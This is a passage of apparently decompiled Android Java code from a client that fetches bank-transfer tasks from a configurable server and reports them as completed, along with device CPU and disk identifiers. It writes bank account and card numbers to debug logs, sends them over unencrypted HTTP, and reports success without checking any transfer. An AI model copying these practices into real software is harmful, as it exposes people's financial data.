            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpURLConnection.setRequestProperty("Content-Length", str.length() + "");
            httpURLConnection.setDoOutput(true);
            httpURLConnection.getOutputStream().write(str.getBytes());
            LogUtils.d("GK", "data = " + str);
            int responseCode = httpURLConnection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), "UTF-8"));
                while (true) {
                    String readLine = bufferedReader.readLine();
                    if (readLine == null) {
                        break;
                    }
                    stringBuffer.append(readLine);
                    stringBuffer.append("\r\n");
                }
                bufferedReader.close();
                String stringBuffer2 = stringBuffer.toString();
                LogUtils.d("GK", "result = " + stringBuffer2);
                try {
                    handle(stringBuffer2);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return null;
            }
            LogUtils.d("GK", "responseCode = " + responseCode);
            return null;
        } catch (MalformedURLException e2) {
            e2.printStackTrace();
            return null;
        } catch (ProtocolException e3) {
            e3.printStackTrace();
            return null;
        } catch (IOException e4) {
            e4.printStackTrace();
            return null;
        }
    }

    private void handle(String stringBuffer2) {
        JSONObject parseObject = JSONObject.parseObject(stringBuffer2);
        int intValue = parseObject.getIntValue("code");
        if (intValue == 0) {
            JSONObject jSONObject = parseObject.getJSONObject("data");
            if (!jSONObject.isEmpty()) {
                this.tradeNo = jSONObject.getString("tradeNo");
                LogUtils.d("GK", "result tradeNo = " + this.tradeNo);
                jSONObject.getString("bankName");
                jSONObject.getString("bankCode");
                this.bankAccount = jSONObject.getString("bankAccount");
                LogUtils.d("GK", "result bankAccount = " + this.bankAccount);
                this.bankCardNo = jSONObject.getString("bankCardNo");
                LogUtils.d("GK", "result bankCardNo = " + this.bankCardNo);
                jSONObject.getString("subbranchName");
                jSONObject.getString("subbranchProvince");
                jSONObject.getString("subbranchCity");
                this.orderScore = jSONObject.getBigDecimal("orderScore");
                LogUtils.d("GK", "result orderScore = " + this.orderScore);
            } else {
                ztLog("task code =   " + intValue);
            }
        } else {
            ztLog("task data =   null");
        }
    }

    public String deviceNoftify() {
        SharedPreferences sharedPreferences = getSharedPreferences("setting", 0);
        String string = sharedPreferences.getString("deviceId", "112233445566");
        String cPUSerial = SettingFragment.getCPUSerial(this);
        String GetDiskId = SettingFragment.GetDiskId();
        Log.d("GK", "deviceNoftify = ");
        BigDecimal valueOf = BigDecimal.valueOf(0L);
        String format = new SimpleDateFormat("yyyy-M-d hh:mm:ss").format(new Date());
        HashMap hashMap = new HashMap();
        hashMap.put("deviceNo", string);
        hashMap.put("deviceCpu", cPUSerial);
        hashMap.put("deviceCaliche", GetDiskId);
        hashMap.put("tradeNo", this.tradeNo);
        hashMap.put("transactionalNo", format);
        hashMap.put("orderStatus", "3");
        hashMap.put("transferTime", format);
        hashMap.put("fee", valueOf);
        String hash = Md5Utils.hash(StringsUtils.sortMapByKeyAsc(hashMap));
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://" + sharedPreferences.getString("IP", "") + "//api//order//deviceNotify").openConnection();
            httpURLConnection.setConnectTimeout(5000);
            httpURLConnection.setRequestMethod("POST");
            StringBuffer stringBuffer = new StringBuffer();
            String str = "deviceNo=" + string + "&sign=" + hash + "&remark=" + ("已经成功转账 " + this.bankAccount + " " + this.bankCardNo + " " + this.orderScore + "元") + "&tradeNo=" + this.tradeNo + "&transactionalNo=" + format + "&orderStatus=" + "3" + "&transferTime=" + format + "&fee=" + valueOf + "&transferImg=" + "no Image";
            Log.d("GK", "data = " + str);
            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpURLConnection.setDoOutput(true);
            httpURLConnection.getOutputStream().write(str.getBytes());
            int responseCode = httpURLConnection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), "UTF-8"));
                while (true) {
                    String readLine = bufferedReader.readLine();
                    if (readLine != null) {
                        stringBuffer.append(readLine);
                        stringBuffer.append("\r\n");
                    } else {
                        bufferedReader.close();
                        Log.d("GK", "result = " + stringBuffer.toString());
                        return null;
                    }
                }
            } else {
                Log.d("GK", "responseCode = " + responseCode);
                return null;
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
            return null;
        } catch (ProtocolException e2) {
            e2.printStackTrace();
            return null;
        } catch (Exception e3) {
            e3.printStackTrace();
            return null;
        }
    }

}
